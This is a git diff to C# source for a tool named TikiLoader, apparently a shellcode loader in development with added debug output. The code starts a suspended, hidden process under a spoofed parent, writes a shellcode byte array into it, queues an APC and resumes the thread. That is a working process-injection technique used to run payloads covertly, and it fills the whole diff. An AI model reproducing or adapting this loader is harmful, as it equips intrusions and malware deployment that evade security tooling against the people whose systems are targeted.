@@ -70,6 +70,7 @@ namespace TikiLoader
                 IntPtr lpPreviousValue,
                 IntPtr lpReturnSize);
 
+            /*
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool CreateProcessW(
                 string lpApplicationName,
@@ -82,11 +83,46 @@ namespace TikiLoader
                 string lpCurrentDirectory,
                 [In] ref STARTUPINFOEX lpStartupInfo,
                 out PROCESS_INFORMATION lpProcessInformation);
+                */
+
+
+            [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            static extern bool CreateProcessW(string lpApplicationName,
+               string lpCommandLine, IntPtr lpProcessAttributes,
+               IntPtr lpThreadAttributes, bool bInheritHandles,
+               uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+               [In] ref STARTUPINFOW lpStartupInfo,
+               out PROCESS_INFORMATION lpProcessInformation);
+
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             //[return: MarshalAs(UnmanagedType.Bool)]
             public delegate void DeleteProcThreadAttributeList(
                 IntPtr lpAttributeList);
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFOW
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
         }
 
         public static byte[] NotepadSc = new byte[344]
@@ -120,12 +156,13 @@ namespace TikiLoader
         private static bool WriteShellcode(IntPtr hProcess, IntPtr baseAddr, byte[] shellcode)
         {
             IntPtr written = IntPtr.Zero;
+            Console.WriteLine($"Shellcode length is type: {shellcode.Length.GetType()}");
             object[] funcargs = 
             {
                 hProcess,
                 baseAddr,
-                shellcode, 
-                shellcode.Length, 
+                shellcode,
+                shellcode.Length,
                 written
             };
 
@@ -200,6 +237,19 @@ namespace TikiLoader
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
 
+        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool CreateProcessW(
+             string lpApplicationName,
+             string lpCommandLine,
+             ref SECURITY_ATTRIBUTES lpProcessAttributes,
+             ref SECURITY_ATTRIBUTES lpThreadAttributes,
+             bool bInheritHandles,
+             uint dwCreationFlags,
+             IntPtr lpEnvironment,
+             string lpCurrentDirectory,
+             [In] ref STARTUPINFO lpStartupInfo,
+             out PROCESS_INFORMATION lpProcessInformation);
 
         /*private static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
         {
@@ -220,10 +270,38 @@ namespace TikiLoader
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
 
-
-        private static bool CreateProcessW(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
+        /*
+        private static bool CreateProcessW(
+              string lpApplicationName,
+              string lpCommandLine,
+              ref SECURITY_ATTRIBUTES lpProcessAttributes,
+              ref SECURITY_ATTRIBUTES lpThreadAttributes,
+              bool bInheritHandles,
+              uint dwCreationFlags,
+              IntPtr lpEnvironment,
+              string lpCurrentDirectory,
+              [In] ref STARTUPINFO lpStartupInfo,
+              out PROCESS_INFORMATION lpProcessInformation)
         {
             lpProcessInformation = default;
+
+            Console.WriteLine($"type of lpApplicationName: {lpApplicationName.GetType()}");
+            
+            //Console.WriteLine($"type of lpCommandLine: {lpCommandLine.GetType()}");
+            Console.WriteLine($"type of lpProcessAttributes: {lpProcessAttributes.GetType()}");
+            Console.WriteLine($"type of lpThreadAttributes: {lpThreadAttributes.GetType()}");
+            Console.WriteLine($"type of bInheritHandles: {bInheritHandles.GetType()}");
+            Console.WriteLine($"type of dwCreationFlags: {dwCreationFlags.GetType()}");
+            Console.WriteLine($"type of lpEnvironment: {lpEnvironment.GetType()}");
+            //Console.WriteLine($"type of lpCurrentDirectory: {lpCurrentDirectory.GetType()}");
+            Console.WriteLine($"type of lpStartupInfo: {lpStartupInfo.GetType()}");
+            Console.WriteLine($"type of lpProcessInformation: {lpProcessInformation.GetType()}");
+
+
+
+            Console.ReadLine();
+            //Environment.Exit(-2);
+            //lpProcessInformation = default;
             object[] funcargs =
             {
                 lpApplicationName, 
@@ -241,6 +319,7 @@ namespace TikiLoader
             return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", "CreateProcessW", typeof(DELEGATES.CreateProcessW), ref funcargs);
 
         }
+        */
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
@@ -298,9 +377,10 @@ namespace TikiLoader
         public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
         {
             STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
+            //STARTUPINFOW sInfoEx = new STARTUPINFOW();
             PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
 
-            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
+            //sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
             IntPtr lpValue = IntPtr.Zero;
 
             Console.WriteLine("inside start process");
@@ -312,7 +392,8 @@ namespace TikiLoader
                 tSec.nLength = Marshal.SizeOf(tSec);
 
                 CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;
-
+                //uint flags = 0x00000004 | 0x00000008 | 0x08000000 | 0x00080000;
+           
                 IntPtr lpSize = IntPtr.Zero;
 
                 InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
@@ -325,8 +406,14 @@ namespace TikiLoader
 
                 UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
 
-                bool create = CreateProcessW(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+                bool create = Imports.CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+                //bool create = CreateProcessW(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx.StartupInfo, out pInfo);
                 Console.WriteLine($"inside try finished creatingprocess: {create} ");
+                if (!create)
+                {
+                    Console.WriteLine("failed to create process leaving");
+                    Environment.Exit(-2);
+                }
                 return pInfo;
 
             }
@@ -376,7 +463,13 @@ namespace TikiLoader
                 Console.WriteLine("finished starting process");
                 var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
                 Console.WriteLine("finished allocating memory");
-                WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+                IntPtr written = IntPtr.Zero;
+                var result = Imports.WriteProcessMemory(pinf.hProcess,
+                baseAddr,
+                shellcode,
+                shellcode.Length,
+                out written);
+                //WriteShellcode(pinf.hProcess, baseAddr, shellcode);
                 Console.WriteLine("finished writing shellcode");
                 Console.WriteLine($"trying to cast: {(IntPtr)shellcode.Length} ");
                 //Environment.Exit(-2);
@@ -387,6 +480,7 @@ namespace TikiLoader
                 Console.WriteLine("finished changing virtual memory");
                 QueueAPC(baseAddr, pinf.hThread);
                 Console.WriteLine("finished queuing apc");
+                //Imports.ResumeThread(pinf.hThread);
                 ResumeTargetThread(pinf.hThread);
                 Console.WriteLine("finished resuming target thread");
             }
